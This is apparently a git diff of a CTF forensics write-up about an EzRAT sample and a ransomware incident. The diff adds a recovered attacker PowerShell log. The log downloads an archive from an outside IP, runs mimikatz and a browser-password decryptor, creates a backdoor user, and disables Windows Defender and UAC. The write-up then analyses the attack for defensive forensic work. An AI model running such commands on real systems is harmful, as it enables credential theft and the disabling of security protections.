@@ -69,7 +69,7 @@ Here is the output of DIE:
 
 We've known this is a C# dotnet executable so let's move on to dnSpy for further analysis.
 
-{{< image src="images/writeups/htb_ca_2024/die1.png" caption="EzRAT Sample" >}}
+{{< image src="images/writeups/htb_ca_2024/ezrat.png" caption="EzRAT Sample" >}}
 
 So this is an EzRAT sample, a C2 malware back in 2020: [Link](https://github.com/Exo-poulpe/EZRAT)
 
@@ -243,7 +243,6 @@ function JrvS(r) {
   return n;
 }
 ```
-
 And the second one is the RC4 function:
 
 ```js
@@ -289,6 +288,7 @@ The final flag is in that script too!
 
 {{< admonition >}}
 Our clan's network has been infected by a cunning ransomware attack, encrypting irreplaceable data essential for our relentless rivalry with other factions. With no backups to fall back on, we find ourselves at the mercy of unseen adversaries, our fate uncertain. Your expertise is the beacon of hope we desperately need to unlock these encrypted files and reclaim our destiny in The Fray.
+
 Note: The valuable data is stored under \Documents\Work
 {{< /admonition >}}
 
@@ -300,43 +300,110 @@ We have an `ad1` image. It is AccessData Logical Image ([Ref](https://tmairi.git
 
 Let's take a deep dive into this case. The victim has mentioned the valuable data is stored under "\Documents\Work".
 
-// image
+{{< image src="images/writeups/htb_ca_2024/autopsy.png" caption="Encrypted file" >}}
 
 The encrypted files has an extension `.korp`. In addtion, we have `ULTIMATUM.hta` as a note from the ransomware group.
 
-// image
+{{< image src="images/writeups/htb_ca_2024/note.png" caption="Ransomware Note" >}}
 
 In the `Downloads` folder, we have `ats_setup.bat` which was intialized a reverse shell connection to the attacker. This is the result from a download action which you can see in Edge browser's history. This is the initial access phase from TA.
 
-// image
+{{< image src="images/writeups/htb_ca_2024/sus_bat.png" caption="Reverse Shell" >}}
 
 The attacker used powershell as the default shell when get a connection from the victim. But there is no Powershell folder in `%appdata%\Windows\` path so we can not get a log from there.
 
 The second way is from Windows Event log. I used `chainsaw` for this process.
 
-```
-log
+```powershell
+$ whoami
+$ systeminfo
+$ net user /domain
+$ net user
+$ net user Guess password /ADD
+$ Set-LocalUser -Name Guess -PasswordNeverExpires $true
+$ pwd
+$ ipconfig
+$ cd C:\User
+$ cd C:\Users
+$ dir
+$ cd tommyxiaomi
+$ cd Documents
+$ dir
+$ Invoke-WebRequest -URI "http://13.53.200.146/intel.zip" -OutFile "./intel.zip"
+$ dir
+$ '&"C:\Program Files\7-Zip\7z.exe" x -p hoilamgi intel.zip'
+$ '&"C:\Program Files\7-Zip\7z.exe" x -phoilamgi intel.zip'
+$ dir
+$ ./mimikatz.exe
+$ ./fscan64.exe
+$ dir
+$ dir
+$ dir
+$ '& "./intel.exe"'
+$ dir
+$ Get-MpComputerStatus | select IsTamperProtected
+$ Get-MpPreference -MAPSReporting 0
+$ Set-MpPreference -MAPSReporting 0
+$ Set-MpPreference -DisableRealtimeMonitoring $true
+$ Get-MpComputerStatus | Select-Object -Property Antivirusenabled,AMServiceEnabled,AntispywareEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled,NISEnabled,OnAccessProtectionEnabled,RealTimeProtectionEnabled,IsTamperProtected,AntivirusSignatureLastUpdated
+$ 'Dism '
+$ Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet
+$ New-ItemProperty -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
+$ Set-MpPreference -DisableRemovableDriveScanning $true
+$ Set-MpPreference -DisableArchiveScanning $True
+$ Get-MpPreference|select DisableArchiveScanning
+$ Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL
+$ cmd.exe /c "C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
+$ Set-MpPreference -DisableRealtimeMonitoring $true
+$ Set-MPPreference -DisableBehaviourMonitoring $true
+$ Add-MpPreference -ExclusionPath 'C:\Users\tommyxiaomi\Documents' -ExclusionExtension '.exe' -Force
+$ Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath "C:\Users\tommyxiaomi\Documents"
+$ '&"C:\Program Files\7-Zip\7z.exe" x -phoilamgi intel.zip'
+$ dir
+$ ./browser-pw-decrypt.exe
+$ ./browser-pw-decrypt.exe all
+$ '& "./intel.exe"'
+$ dir
+$ cd report
+$ dir
+$ cd ..
+$ dir
+$ rm ./*.exe -force
+$ dir
+$ rm intel.zip -force
+$ dir
+$ exit
 ```
 
-After getting a connection from the victim, TA continue downloading a password-protected zip file named `intel.zip`. He decompressed the file and ran some executables in it. One is the `browser-pw-decrypt.exe`, maybe this is for browser's credentials extraction. Another one is `intel.exe`, I guess this is the ransomware. When finished, the attacker deleted all of the associated files which make us likely have no chance to obtain the malware.
+After getting a connection from the victim, TA continue downloading a password-protected zip file named `intel.zip`. He decompressed the file and ran some executables in it. One is the `browser-pw-decrypt.exe`, maybe this is for browser's credentials extraction. Another one is `intel.exe`, I guess this is the ransomware. `./mimikatz.exe` is used to extract LSASS secret and `fscan64.exe` maybe for connection scanning? When finished, the attacker deleted all of the associated files which make us likely have no chance to obtain the malware.
 
 Now the question is: Where is the intel.zip? We have known that the attacker had erased it from the system. BUT, before running those executables, TA ran some commands to disable the Windows Defender! From this point, we can actually recover the ransomware if it was quarantined by the Defender. Let's check the Windows Defender folder.
 
-// image
+{{< image src="images/writeups/htb_ca_2024/defender.png" caption="Defender directory" >}}
 
-We have almost of the critical evidences in this folder. The important file is in `Quarantine` and we have to decrypt it. // link
+We have almost of the critical evidences in this folder. The important file is in `Quarantine` and we have to decrypt it. ([Ref](https://jon.glass/blog/quarantines-junk/))
 
 I used this tool to recover the malware: [Link](https://github.com/zam89/Windows-Defender-Quarantine-File-Decryptor)
 
 Okay we have the malware now. Let's reverse it!
 
-// image
+This is the function will recusively enumerate in the directory to encrypt files. It takes some valid extension to encrypt, some are not, e.g: .korp, .hta or desktop.ini file.
 
+{{< image src="images/writeups/htb_ca_2024/ransomware1.png" caption="Encrypt function" >}}
 
+The function calls another one which is `coreEncrypter.EncryptFile()`. In this function, we can see it intializes AES-CBC-256 as the core encrypter.
 
-// image
+{{< image src="images/writeups/htb_ca_2024/ransomware2.png" caption="Figure" >}}
 
-Here is the script that can be used to decrypt the needed file.
+The password is used for the deriving phase is generated in the `Main()` function of the program.
+
+{{< image src="images/writeups/htb_ca_2024/ransomware3.png" caption="Figure" >}}
+
+Although the UID was generated randomly, we still can recover it from `ULTIMATUM.hta` file as the ransomware writes UID to that file in `alert.ValidateAlert()`.
+
+{{< image src="images/writeups/htb_ca_2024/ransomware4.png" caption="Random UID generation" >}}
+
+Now we have all of the important parameters to decrypt the files. Here is the script that can be used to do that process.
 
 ```py
 from Crypto.Cipher import AES
@@ -367,10 +434,10 @@ plaintext = Cipher.decrypt(enc_data)
 with open('Applicants_info.xlsx', 'wb') as out:
     out.write(unpad(plaintext, AES.block_size))
 ```
+
+{{< image src="images/writeups/htb_ca_2024/excel.png" caption="Flag" >}}
+
 The flag is in that Excel file.
-
-// image
-
 
 ### Oblique Final
 
